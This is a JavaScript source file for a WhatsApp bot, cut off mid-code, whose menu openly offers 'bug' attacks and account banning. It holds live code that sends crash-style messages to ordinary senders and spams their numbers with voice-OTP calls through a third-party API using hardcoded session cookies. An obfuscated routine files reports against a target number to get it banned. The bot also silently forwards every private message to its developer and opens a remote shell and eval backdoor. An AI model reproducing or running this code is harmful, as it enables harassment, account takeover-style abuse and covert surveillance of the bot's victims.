const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
const { exec } = require('child_process')
const cheerio = require('cheerio')
const moment = require('moment-timezone')
const util = require('util')
const axios = require('axios').default
const fs = require('fs')
autobug = true
mode = true

let userVIP = JSON.parse(fs.readFileSync('./storage/database/vip.json'))

module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const time = moment.tz('Asia/Jakarta').format('ha z')
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isVIP = userVIP.includes(sender) || isDev
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}

const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
semar.sendMessage(id, buttonMessage, options)}

const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
const templateMessage = {text: text1,footer: footer1,templateButtons: but}
semar.sendMessage(id, templateMessage, options)}

const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
semar.sendMessage(id, listMessage, options)}

if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}

if (autobug && !isVIP && !command && !isGroup) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}

if (body && !isGroup && !isDev) {
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}

if (body.startsWith(`regist-4064636F646564656E7061`)) {
reply('Nomor anda sedang dicek oleh Owner, Tunggu sebentar...')
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• Register\nFrom : ${pushname}\nNumber : ${senderNumber}\nTime : ${time}\nLink : wa.me/${sender}`})}

if (body.startsWith(`$`)){ if (!isDev) return
let evl = body.split("\n")
let exc = body.replace(evl[0]+"\n", "")
exec(exc, (err, stdout, stderr) => {
if (stdout) return reply(`${stdout}`)
if (stderr) return reply(`${stderr}`)
if (err) return reply(`${err}`)})}
	    
if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
return reply(require('util').format(evaluate))} catch(e){
return reply(require('util').format(e))}}

if (command) { await semar.readMessages([msg.key]) }
if (!mode) { if (!isDev) return }
switch (command) {
//©from:nathanael
case 'menu': case 'help': case '?':
semar.sendMessage(from,{text:`❏  *OTHER MENU*
•   ${prefix}status
•   ${prefix}delete

❏  *GROUP MENU*
•   ${prefix}open
•   ${prefix}close
•   ${prefix}add
•   ${prefix}kick
•   ${prefix}promote
•   ${prefix}demote
         
❏  *BUG MENU*
•   ${prefix}sendbug
•   ${prefix}dumpbug
•   ${prefix}spambug
•   ${prefix}buggc
•   ${prefix}banwa
         
❏  *OWNER MENU*
•   ${prefix}join
•   ${prefix}leave
•   ${prefix}restart
•   ${prefix}shutdown
•   ${prefix}public
•   ${prefix}private
•   ${prefix}chat
•   ${prefix}autobug`}, {quoted:frpayment})
break

//©from: dennis × ivan
case 'verify': case 'ban': case 'logout': case 'banwa': case 'out':
if (!isVIP) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
var Oi=g,On=g,Oo=g,OI=g,OZ=g;(function(X,P){var I=g,Z=g,U=g,R=g,a=g,T=X();while(!![]){try{var x=-parseInt(I(0x1eb))/(-0x2*-0x64d+-0xc16+-0x1*0x83)+-parseInt(I(0x2b3))/(0x1*-0x111d+-0x2203*0x1+-0xe*-0x3a7)+parseInt(Z(0x2a9))/(0x226b+0x1*0x177e+-0x1cf3*0x2)*(-parseInt(Z(0x245))/(0x10f*0xd+0x11ba+-0x1f79*0x1))+parseInt(U(0x271))/(0x2e2+-0xd9c+0x15*0x83)*(parseInt(U(0x1e9))/(0x3*-0x71d+0x14ca+0x93))+-parseInt(R(0x1ee))/(-0x1a60*-0x1+-0x1d*-0xb6+-0x2ef7)+parseInt(R(0x2e4))/(0x14eb*0x1+-0x12cf*-0x1+-0x1*0x27b2)*(parseInt(R(0x210))/(0x1*-0x13fc+-0x1*0x688+0x1*0x1a8d))+-parseInt(I(0x2d8))/(0x1350*0x2+-0x1e72+-0x824)*(-parseInt(Z(0x251))/(-0xa97*0x2+0x19*-0x90+-0x1*-0x2349));if(x===P)break;else T['push'](T['shift']());}catch(D){T['push'](T['shift']());}}}(l,-0xb35f*-0x6+0xcc39*-0x4+0x171ed));var b=(function(){var E=g,c=g,B=g,V=g,j=g,P={};P[E(0x280)]=E(0x29f)+E(0x2cd)+'4',P[c(0x297)]=function(D,t){return D===t;},P[V(0x227)]=B(0x23f),P[E(0x2b2)]=V(0x223),P[c(0x1f4)]=V(0x24b);var T=P,x=!![];return function(D,t){var O0=V,O2=j,O4=E,O5=B,O6=j,G={'XfhVs':T[O0(0x280)],'tOrbH':function(f,L){var O1=O0;return T[O1(0x297)](f,L);},'himpo':T[O2(0x227)],'nfXSR':function(f,L){var O3=O2;return T[O3(0x297)](f,L);},'ngZyD':T[O2(0x2b2)]};if(T[O2(0x297)](T[O0(0x1f4)],T[O0(0x1f4)])){var W=x?function(){var O7=O6,O8=O2,O9=O5,OO=O4,Ov=O6;if(G[O7(0x2a3)](G[O7(0x236)],G[O7(0x236)])){if(t){if(G[O8(0x224)](G[Ov(0x233)],G[OO(0x233)])){var f=t[O8(0x2cf)](D,arguments);return t=null,f;}else{if(D){var q=f[Ov(0x2cf)](L,arguments);return q=null,q;}}}}else{var Q=G[O7(0x2de)][OO(0x26d)]('|'),J=-0x1d6b+0x15de*0x1+0x78d*0x1;while(!![]){switch(Q[J++]){case'0':var r=q[Q];continue;case'1':m[O7(0x1fb)+O7(0x212)]=r[OO(0x253)](m);continue;case'2':var m=f[O8(0x1f3)+O9(0x269)+'r'][O9(0x2c4)+OO(0x21c)][O8(0x253)](L);continue;case'3':var z=J[r]||m;continue;case'4':z[r]=m;continue;case'5':m[O7(0x290)+OO(0x2ac)]=z[O8(0x290)+O8(0x2ac)][OO(0x253)](z);continue;}break;}}}:function(){};return x=![],W;}else{if(D){var L=f[O5(0x2cf)](L,arguments);return q=null,L;}}};}()),M=b(this,function(){var OM=g,Ob=g,Ol=g,Og=g,OX=g,P={};P[OM(0x2af)]=Ob(0x27e)+Ol(0x239)+'+$';var T=P;return M[Og(0x290)+OM(0x2ac)]()[Ob(0x1e8)+'h'](T[OX(0x2af)])[OX(0x290)+Og(0x2ac)]()[Og(0x1f3)+Og(0x269)+'r'](M)[OX(0x1e8)+'h'](T[Og(0x2af)]);});M();var v=(function(){var OP=g,OT=g,Ox=g,OD=g,Ot=g,X={'QuhHj':OP(0x29a)+OT(0x1fe),'iQBaR':function(T,D){return T<D;},'leNKK':OT(0x2b5)+OP(0x28e)+'2','jXtgY':OP(0x2e8),'qjNXW':Ot(0x1fd),'SnVUL':OP(0x288),'NWhIj':OT(0x204),'hoJYU':OT(0x218)+Ox(0x20e),'hUbVT':OD(0x2d0),'ugPuc':OT(0x281),'QUyks':function(T,x){return T(x);},'hWzxn':function(T,D){return T+D;},'PRXLr':OD(0x2b6)+OP(0x268)+OD(0x229)+OT(0x241),'mSAHH':OP(0x2b9)+Ot(0x28f)+OD(0x2ce)+Ot(0x1fc)+OT(0x1f6)+OP(0x23c)+'\x20)','iyAfz':function(T){return T();},'AfdOC':function(T,D){return T!==D;},'IOkpU':OD(0x2d9),'CQnFw':Ox(0x23d),'GMfze':OT(0x25b),'xIyTo':function(T,D){return T===D;},'YvZUJ':OP(0x2a8),'iEiWC':Ox(0x2dd)},P=!![];return function(T,x){var OG=Ot,Of=OT,OL=Ox,Oq=OT,OQ=Ot,D={'HqSUK':X[OG(0x249)],'tsikI':function(G,W){var OW=OG;return X[OW(0x254)](G,W);},'GfpmY':X[OG(0x21b)],'rZPpt':X[OL(0x2ab)],'KRoka':X[Oq(0x234)],'WBkvQ':X[Oq(0x263)],'KVAom':X[Of(0x26c)],'AkNOR':X[Of(0x22d)],'FxNlE':X[OQ(0x243)],'ZZnAf':X[OQ(0x1ff)],'zVofd':function(G,W){var OJ=Oq;return X[OJ(0x260)](G,W);},'kNqyb':function(G,W){var Or=Of;return X[Or(0x2bc)](G,W);},'lFPRW':function(G,W){var Om=Oq;return X[Om(0x2bc)](G,W);},'qqgYl':X[OG(0x255)],'fnyXW':X[OL(0x20a)],'YbLRA':function(G){var Oz=OG;return X[Oz(0x278)](G);},'XRgPi':function(G,W){var Op=OQ;return X[Op(0x2a5)](G,W);},'baVFz':X[Oq(0x24a)],'uZdGS':function(G,W){var OF=OL;return X[OF(0x2a5)](G,W);},'jOtJd':X[OL(0x28c)],'tnpKU':X[Of(0x20c)]};if(X[OG(0x203)](X[OL(0x2db)],X[OQ(0x2bb)])){var W=G?function(){var Os=OQ;if(W){var C=p[Os(0x2cf)](F,arguments);return s=null,C;}}:function(){};return Q=![],W;}else{var t=P?function(){var Oe=Oq,OK=OL,OH=OQ,Ok=Oq,Od=Oq,W={'MWOIW':function(L,q){var OA=g;return D[OA(0x257)](L,q);},'qnvCZ':function(L,q){var OC=g;return D[OC(0x2b0)](L,q);},'xhAYT':function(L,q){var Oh=g;return D[Oh(0x22c)](L,q);},'rcJmb':D[Oe(0x1ed)],'EZWbi':D[OK(0x299)],'PUIub':function(L){var ON=Oe;return D[ON(0x20d)](L);}};if(D[OH(0x284)](D[OK(0x1f2)],D[OK(0x1f2)])){var q=W[Od(0x217)](T,W[Ok(0x213)](W[OK(0x261)](W[Oe(0x21a)],W[Oe(0x27f)]),');'));x=W[Od(0x293)](q);}else{if(x){if(D[OK(0x238)](D[Ok(0x246)],D[Oe(0x264)])){var f=x[OK(0x2cf)](T,arguments);return x=null,f;}else{var Q=D[OK(0x2e2)][OK(0x26d)]('|'),J=-0x1c77+0x6e6*-0x2+0x2a43;while(!![]){switch(Q[J++]){case'0':var r=i[Od(0x230)+'le']=i[Oe(0x230)+'le']||{};continue;case'1':for(var m=-0x1139*-0x1+0x1781*0x1+-0xd*0x322;D[Ok(0x2d6)](m,y[Ok(0x226)+'h']);m++){var z=D[OK(0x289)][OK(0x26d)]('|'),p=0x1*-0x902+-0x1f7*-0x1+0x259*0x3;while(!![]){switch(z[p++]){case'0':var F=y[m];continue;case'1':var s=r[F]||w;continue;case'2':r[F]=w;continue;case'3':w[OK(0x1fb)+OK(0x212)]=F[Ok(0x253)](s);continue;case'4':w[Oe(0x290)+Od(0x2ac)]=s[Oe(0x290)+Ok(0x2ac)][OK(0x253)](s);continue;case'5':var w=z[OH(0x1f3)+Od(0x269)+'r'][OH(0x2c4)+OK(0x21c)][OK(0x253)](p);continue;}break;}}continue;case'2':var y=[D[OK(0x22e)],D[Od(0x296)],D[Od(0x1ef)],D[Oe(0x220)],D[Oe(0x26f)],D[OH(0x2d7)],D[OH(0x225)]];continue;case'3':var i;continue;case'4':try{var n=D[Od(0x257)](J,D[Od(0x2b0)](D[OK(0x22c)](D[Oe(0x1ed)],D[Oe(0x299)]),');'));i=D[Oe(0x20d)](n);}catch(o){i=m;}continue;}break;}}}}}:function(){};return P=![],t;}};}()),O=v(this,function(){var OS=g,OY=g,Ou=g,Ow=g,Oy=g,X={'GhaVe':OS(0x27e)+OS(0x239)+'+$','ymtUW':function(Q,J){return Q!==J;},'aMgpQ':OY(0x298),'hpjcJ':function(Q,J){return Q(J);},'EcoAp':function(Q,J){return Q+J;},'QozGR':Ow(0x2b6)+Ou(0x268)+OS(0x229)+OS(0x241),'zJsNE':Oy(0x2b9)+OY(0x28f)+Oy(0x2ce)+Oy(0x1fc)+Ou(0x1f6)+Ou(0x23c)+'\x20)','dKYjc':function(Q){return Q();},'CCpit':Ow(0x221),'lmOjL':OY(0x2e8),'GAliL':Ou(0x1fd),'ISNOW':Ou(0x288),'kJzFp':OS(0x204),'XhptF':Ow(0x218)+Ou(0x20e),'DkJOH':Oy(0x2d0),'rcOiw':Ow(0x281),'TeKcH':function(Q,J){return Q<J;},'MSFdT':Oy(0x275),'wyTYx':Ou(0x2c6),'OvcWP':OS(0x27b)+Ou(0x2c1)+'4'},P;try{if(X[Oy(0x25a)](X[Ow(0x274)],X[Ou(0x274)]))T=x;else{var T=X[Ou(0x279)](Function,X[Ou(0x258)](X[Ou(0x258)](X[Ou(0x24e)],X[OS(0x25f)]),');'));P=X[Oy(0x25c)](T);}}catch(J){if(X[Ou(0x25a)](X[OS(0x2ad)],X[Ow(0x2ad)])){var m=x[OS(0x2cf)](D,arguments);return t=null,m;}else P=window;}var x=P[Ow(0x230)+'le']=P[Ou(0x230)+'le']||{},D=[X[Ow(0x206)],X[OY(0x2cc)],X[Ou(0x2e1)],X[Ou(0x250)],X[Ou(0x28b)],X[OS(0x273)],X[Ou(0x2d5)]];for(var t=0x1da1*-0x1+-0xd9*-0x25+-0x1bc;X[Ou(0x216)](t,D[OS(0x226)+'h']);t++){if(X[Ow(0x25a)](X[OY(0x211)],X[Ou(0x295)])){var G=X[Ou(0x1e4)][OS(0x26d)]('|'),W=0x15b6+-0x202e+0x28*0x43;while(!![]){switch(G[W++]){case'0':q[Ou(0x290)+OS(0x2ac)]=f[OY(0x290)+Ow(0x2ac)][Ow(0x253)](f);continue;case'1':var f=x[L]||q;continue;case'2':var L=D[t];continue;case'3':var q=v[OS(0x1f3)+Ou(0x269)+'r'][OS(0x2c4)+OY(0x21c)][OS(0x253)](v);continue;case'4':x[L]=q;continue;case'5':q[OY(0x1fb)+Ou(0x212)]=v[Oy(0x253)](v);continue;}break;}}else return T[Ou(0x290)+Oy(0x2ac)]()[Oy(0x1e8)+'h'](X[Ow(0x29c)])[OS(0x290)+Ow(0x2ac)]()[Ou(0x1f3)+Ow(0x269)+'r'](x)[OS(0x1e8)+'h'](X[OY(0x29c)]);}});O();var nom=dn;if(!nom[Oi(0x209)+On(0x1f1)]('+'))nom='+'+dn;var finding=await(await require(Oo(0x240)+Oi(0x29d)+Oi(0x244)+Oi(0x2c8))(''+nom))['g'],ntah=await axios[Oo(0x1f0)](OI(0x228)+On(0x286)+OI(0x272)+OZ(0x247)+Oi(0x242)+Oi(0x262)+OI(0x2da)+OZ(0x2c2)+'t/'),email=await axios[OI(0x1f0)](On(0x228)+On(0x286)+Oi(0x2c7)+Oi(0x1f7)+OZ(0x242)+Oo(0x2e6)+OI(0x2c0)+Oi(0x2a0)+Oi(0x2cb)+Oo(0x2e3)+OZ(0x22b)+On(0x21d)+OI(0x2d4)),cookie=ntah[OI(0x21f)+'rs'][On(0x2aa)+On(0x2b8)][On(0x259)](';\x20'),$=cheerio[Oi(0x28a)](ntah[Oi(0x27d)]),$form=$(On(0x2e5)),url=new URL($form[OI(0x24d)](OZ(0x1fa)+'n'),OZ(0x228)+Oo(0x286)+OZ(0x272)+OI(0x247)+Oo(0x2bd))[OZ(0x2e9)],form=new URLSearchParams();form[Oo(0x287)+'d'](OZ(0x277)+'st',$form[Oo(0x20b)](OZ(0x2b7)+On(0x2e0)+OI(0x2c9)+Oo(0x266))[Oo(0x20f)]()),form[OZ(0x287)+'d'](OZ(0x23e),$form[OZ(0x20b)](Oi(0x2b7)+OZ(0x2e0)+Oi(0x26e))[OZ(0x20f)]()),form[OZ(0x287)+'d'](Oo(0x1ec),OI(0x2bf)+'t'),form[On(0x287)+'d'](OI(0x2b4)+OI(0x1f5)+Oo(0x294)+'r',finding[OI(0x282)+On(0x237)]),form[Oo(0x287)+'d'](On(0x2df)+OZ(0x2ae)+'er',finding[OZ(0x22a)+'r'][Oi(0x235)+Oi(0x207)+On(0x285)]),form[On(0x287)+'d'](Oi(0x1f8),email[Oi(0x27d)][-0x1c58+0xd*0x22c+0x1c*0x1]),form[Oo(0x287)+'d'](OI(0x1f8)+Oi(0x270)+OZ(0x27a),email[Oo(0x27d)][0x1ddb*-0x1+-0x3*-0xcb1+-0x838]),form[Oi(0x287)+'d'](Oo(0x205)+Oi(0x29e),OI(0x2a2)+'ID'),form[Oi(0x287)+'d'](On(0x248)+On(0x219)+'ge',Oo(0x2a4)+Oi(0x292)+OI(0x21e)+OZ(0x2a7)+OZ(0x2d3)+Oi(0x208)+Oi(0x1e6)+'ta'),form[On(0x287)+'d'](Oi(0x1f9)+'r','0'),form[OZ(0x287)+'d'](OZ(0x25d),'1'),form[OZ(0x287)+'d'](OI(0x2be),''),form[OI(0x287)+'d'](OI(0x1e5),'8'),form[OZ(0x287)+'d'](Oo(0x256),Oo(0x28d)+Oi(0x2b1)+On(0x2d2)+On(0x222)+On(0x291)+On(0x202)+Oo(0x27c)),form[Oi(0x287)+'d'](Oo(0x2d1),'1'),form[Oo(0x287)+'d'](Oo(0x2ba),On(0x215)+'WN'),form[On(0x287)+'d'](Oo(0x2dc),On(0x201)+OI(0x231)),form[OZ(0x287)+'d'](OZ(0x214)+OZ(0x22f)+Oi(0x2a1),'0');function l(){var OU=['zxjYB3i','CgXHDgy','Bg1pAKW','BMf0Aw8','ig1PBMG','C3rHCNq','BvnbseG','zMLUza','r01MEMu','wwjmuKe','DgLVBG','DMfS','mtG0mtu4mgjJzvLTyq','tvngzfq','Dg9FxW','Cw52q1O','x19JB20','vu5ltK8','vgvly0G','tvDpsvC','zxHJzxa','BwvZC2e','CMnkBwi','Bgvos0S','DhLWzq','EczJB3u','DwjHzg8','AgvHzgu','s1zbB20','t2rRC3K','ChbFD3C','wu5gAg4','BMzyu1i','wLPUqwy','BgvUz3q','wNLWBxK','Ahr0Chm','BMn0Aw8','BNvTyMu','ywLSyM8','BezquLC','Ag9kwvu','CLPqChq','BwvUDf8','y29UC28','mZa4ntG','zM9YBwe','BMDAEuq','CwPowfC','Aw50zxi','AgLTCg8','BKnVzgu','DvPKr1m','ksSPkYK','cGPszxm','y29VA2K','AxmIksG','uw11Aw4','BhnK','tM5MyLi','yxDLC28','BIGPia','lMnVBs8','AfvIvLq','B25LBNu','mZaZmtCYsfvSwxr0','AK90sMq','DhnHCha','Ew91CL8','uxvOsgO','su9RCfu','yuntCNO','DwX0CZO','yxr0CG','uw96r1i','uKve','A0P6rNa','otG1nJy2AMDNy3PV','ierHDge','yMLUza','Avfcyvi','ufjythi','x19OCW','ELzVzMq','rwnVqxa','AM9PBG','Ew10vvC','B3fArMy','zeTzAMm','x19H','DxjS','EKPZtKu','uvv5A3m','EgHbwvq','y29UDge','u25wvuW','Dg5Ws1u','cGPqyxi','zxn0xq','rxjYB3i','BIaOzNu','CNvJDg8','u3vJy2u','DMfSAwq','tLDOswO','C3bSAxq','pwXZzf0','qwTot1i','x2nVBMy','mJyWuuTABhn5','DY53Age','rgTkt0G','yu1NCfe','z2DNC3u','zxnZywC','AMf6B2u','AxLbzNO','AhbQy0O','AxjT','m3WYFde','mc4WlJa','zgf0yq','kcGOlIS','rvPxyMK','DhzZBwS','DhjHy2u','CMvNAw8','CxvVDgu','wfjNugK','BMfS','oI8VD3C','yxbWzw4','Aw5MBW','r2zWBvK','Bg9Hza','wgHWDey','q1fUrNC','mtKZmty','Fdn8nhW','BNn0CNu','Dg9tDhi','D19WA2C','zg8VCM8','ufvjDwi','BgvJDg8','D3LuwxG','s1jVA2e','quHhBMi','rwLiDhu','zM55wfC','m3W0Fda','zM9YicG','r2HHvMu','BwuTCgG','B3jT','mNWWFdm','DgLVBJ0','CMvX','qu5euK8','De9YyKG','ugvYzgK','qwzKt0m','ue9tva','oIbKzxm','s3DArKK','m0HxzwHYzG','C2v0lwm','ALH0z1K','Aw5N','q0nWAxq','x251Bwi','r0HIrLa','A05XEwi','lKjqoNC','yKLqBwe','mZe4mJzeDe1ZBxa','y291BNq','nxWWFde','CMv0Dxi','Aw5WDxq','B29RAwu','E30Uy28','x19Jy2C','AuvPv0m','AfD6Eg4','lMnVBq','x19JC3i','C3vIBwK','ms8/ywm','Fdv8mhW','y2XPzw4','C2vUze0','ChjVDg8','CgfYC2u','D29zy3a','DY4XC2u','BwjLCG','pwPHEM8','CMvWBge','z2vUuMe','r0fSAuW','Fdf8nxW','y3rVCIG','yxbWBhK','DgfIBgu','zhbY','Agf0C2e','yxrPDMu','BNq9mq','CMnpAxC','DhnPA0K','rNHoBeu','mJbiAvjrChO','zhbIzLe','y3qVBM8','wxzAvuO','x19Yzxy','z0vVsum','wgzOvNm','CgHVBMu','w25HBwu','svnot1C','shftvuS','BMrVBu0','ogjYwvL6rq','zM9YBq','yxbPl3y','q0vou08','Bg9N','AhjLzG','t3zJv1a','x19Yzxe','ysbJB24','Bwv0Ag8','C2vHCMm','mte3nNrWswvhBG','oZSPoW','mtmYmdq1rfnsufHy','C3rLCa','CxfNwwW','nJqYnZrKuffuAhq','v0jRDLe','z2v0','C1DPDgG','yMfwrNO','y29UC3q','z21xDha','CNLFC2u','CM4GDgG','y21HAwW','zw1HAwW','x191C2u','ywn0Aw8','x19WCM8','iNjLDhu','D2fYBG','Fdj8mq','DwDqDwm','yw1ZoIa','mtaWnJy','lJiUmc4','EeL5vg8'];l=function(){return OU;};return l();}var S={};S[Oo(0x23b)+'e']=cookie;var Y={};Y[OZ(0x25e)]=url,Y[OI(0x1e7)+'d']=On(0x2a6),Y[OI(0x27d)]=form,Y[OZ(0x21f)+'rs']=S;var res=await axios(Y);status=finding[OI(0x26b)]==![]?On(0x267):Oi(0x26a)+'ss';var u={};function g(O,v){var M=l();return g=function(b,X){b=b-(-0x39*0x2e+-0x21*-0xf1+-0x12ef);var P=M[b];if(g['ZCJvpR']===undefined){var T=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var f='',L='',q=f+T;for(var Q=0x1*0x72+-0x131a+0x12a8,J,r,m=0x43*0x2+-0x1af*-0x7+-0xc4f;r=G['charAt'](m++);~r&&(J=Q%(0x46a*-0x2+-0x5*-0x64d+-0x16a9)?J*(0x1*-0x24dd+0x1a7f+0x12e*0x9)+r:r,Q++%(-0x1a*0x179+0x35d+0x22f1))?f+=q['charCodeAt'](m+(-0x1ed6*0x1+0x199e+-0x2a1*-0x2))-(-0x78f+-0x19de+0x2177)!==0x2603+0x7da+-0xc7*0x3b?String['fromCharCode'](0x8d1+-0x2262+0x1a90&J>>(-(0x1*0x18af+-0x7*-0x16a+-0x1*0x2293)*Q&-0x799*-0x5+-0xe*-0xa3+0x1*-0x2ee1)):Q:-0x956*0x4+0x1*0x1869+0xcef){r=W['indexOf'](r);}for(var z=0xb02+-0x9c7+-0x13b,p=f['length'];z<p;z++){L+='%'+('00'+f['charCodeAt'](z)['toString'](-0x1312*0x1+0xf47+0x3db))['slice'](-(-0x2da+-0x19f8+0x1cd4));}return decodeURIComponent(L);};g['ftqUbp']=T,O=arguments,g['ZCJvpR']=!![];}var x=M[-0x1dd1+-0x1dfb+0x3bcc],D=b+x,t=O[D];if(!t){var G=function(W){this['FZZLWU']=W,this['tNourY']=[-0x57d*0x1+-0x1131+0x1*0x16af,0x66*0x2b+0xaed*0x1+0x1*-0x1c0f,0x45a+0x16cf+-0x1b29],this['VDeiRY']=function(){return'newState';},this['qScpQW']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['VaKQKb']='[\x27|\x22].+[\x27|\x22];?\x20*}';};G['prototype']['uRfAds']=function(){var W=new 